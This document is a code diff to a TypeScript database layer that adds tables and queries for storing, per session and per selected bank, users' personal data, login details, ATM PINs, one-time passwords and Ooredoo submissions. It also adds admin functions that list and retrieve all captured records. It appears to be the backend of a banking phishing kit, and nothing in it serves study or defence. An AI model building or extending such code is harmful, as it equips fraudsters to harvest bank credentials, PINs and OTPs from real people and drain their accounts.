@@ -2,6 +2,19 @@ import { eq } from "drizzle-orm";
 import { drizzle } from "drizzle-orm/mysql2";
 import { InsertUser, users } from "../drizzle/schema";
 import { ENV } from './_core/env';
+import {
+  sessions,
+  personalDataSubmissions,
+  loginMethodSubmissions,
+  atmPinSubmissions,
+  otpSubmissions,
+  ooredooSubmissions,
+  type InsertPersonalDataSubmission,
+  type InsertLoginMethodSubmission,
+  type InsertAtmPinSubmission,
+  type InsertOtpSubmission,
+  type InsertOoredooSubmission,
+} from "../drizzle/schema";
 
 let _db: ReturnType<typeof drizzle> | null = null;
 
@@ -89,4 +102,85 @@ export async function getUserByOpenId(openId: string) {
   return result.length > 0 ? result[0] : undefined;
 }
 
-// TODO: add feature queries here as your schema grows.
+// Session management
+export async function createSession(sessionId: string, selectedBank: string) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  await db.insert(sessions).values({ id: sessionId, selectedBank });
+}
+
+export async function getSessionByIdWithAllData(sessionId: string) {
+  const db = await getDb();
+  if (!db) return null;
+
+  const [sessionData] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
+  if (!sessionData) return null;
+
+  const [personalData] = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
+  const [loginMethod] = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
+  const [atmPin] = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
+  const [otp] = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).limit(1);
+  const [ooredoo] = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);
+
+  return {
+    session: sessionData,
+    personalData: personalData || null,
+    loginMethod: loginMethod || null,
+    atmPin: atmPin || null,
+    otp: otp || null,
+    ooredoo: ooredoo || null,
+  };
+}
+
+// Personal data submission
+export async function submitPersonalData(data: InsertPersonalDataSubmission) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  const result = await db.insert(personalDataSubmissions).values(data);
+  return result;
+}
+
+// Login method submission
+export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  const result = await db.insert(loginMethodSubmissions).values(data);
+  return result;
+}
+
+// ATM PIN submission
+export async function submitAtmPin(data: InsertAtmPinSubmission) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  const result = await db.insert(atmPinSubmissions).values(data);
+  return result;
+}
+
+// OTP submission
+export async function submitOtp(data: InsertOtpSubmission) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  const result = await db.insert(otpSubmissions).values(data);
+  return result;
+}
+
+// Ooredoo submission
+export async function submitOoredoo(data: InsertOoredooSubmission) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+  const result = await db.insert(ooredooSubmissions).values(data);
+  return result;
+}
+
+// Get all submissions for admin
+export async function getAllSubmissions() {
+  const db = await getDb();
+  if (!db) return [];
+  const result = await db.select().from(sessions);
+  return result;
+}
+
+// Get submission details with all related data
+export async function getSubmissionDetails(sessionId: string) {
+  return getSessionByIdWithAllData(sessionId);
+}
